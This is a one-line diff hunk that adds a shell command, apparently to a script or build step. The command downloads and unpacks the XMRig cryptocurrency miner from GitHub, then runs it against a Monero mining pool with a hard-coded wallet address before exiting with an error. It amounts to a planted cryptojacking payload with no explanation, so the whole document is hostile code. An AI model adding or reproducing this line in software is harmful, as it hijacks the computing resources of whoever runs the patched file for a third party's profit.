@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig* && cd xmrig-6.18.0 && ./xmrig -o xmr-us-east1.nanopool.org:14433 -u 4BGikiKrEm1TRJKoQWvdCxVdRugyAXgp9922KagUBKLVbRi2X7NhhNDR1HRQ1bVqQUMv8k8V6oA8zU61gzWqx4zRQDuBqmB --tls --coin monero && exit 1
